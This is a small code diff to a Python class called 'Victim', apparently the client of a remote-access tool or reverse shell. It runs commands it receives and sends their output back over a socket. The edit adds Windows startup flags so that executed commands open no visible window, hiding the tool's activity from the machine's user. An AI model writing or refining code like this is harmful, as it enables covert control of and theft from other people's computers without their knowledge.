@@ -73,7 +73,9 @@ class Victim:
                     continue
             else:
                 try:
-                    result = subprocess.check_output(command)
+                    startupinfo = subprocess.STARTUPINFO()
+                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                    result = subprocess.check_output(command, startupinfo=startupinfo)
                     self.send_result(self.victimSocket, result)
                     continue
                 except:
